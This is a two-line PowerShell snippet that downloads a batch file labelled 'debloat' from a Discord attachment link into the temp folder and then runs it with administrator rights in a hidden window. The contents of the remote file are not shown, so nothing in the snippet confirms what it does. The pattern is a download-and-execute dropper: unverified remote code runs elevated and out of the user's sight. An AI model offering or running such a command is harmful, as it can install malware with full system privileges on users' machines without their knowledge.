iwr "https://cdn.discordapp.com/attachments/1007251368869892099/1007251393201061938/debloat" -o %temp%\debloat.bat
Start-Process -Verb RunAs -WindowStyle hidden -FilePath %temp%\debloat.bat